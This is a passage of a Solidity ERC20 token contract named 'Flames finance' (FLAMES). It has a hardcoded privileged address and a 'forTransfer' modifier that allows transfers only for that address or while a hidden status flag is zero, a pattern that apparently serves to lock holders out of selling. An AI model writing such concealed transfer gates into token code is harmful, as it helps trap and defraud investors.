...
contract TestFlamesToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenh_totalSupply;
    uint256 private _tokenh_status = 0;
    uint256 public stakingPoolhStatus = 0;

    string private _tokenh_name;
    string private _tokenh_symbol;

    address private _poolhAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokenh_name = "Flames finance";
        _tokenh_symbol = "FLAMES";
        _tokenh_totalSupply = 100000 * 10 ** 18;
        _balances[msg.sender] = _tokenh_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolhAddress || _tokenh_status == 0);
        _;
    }
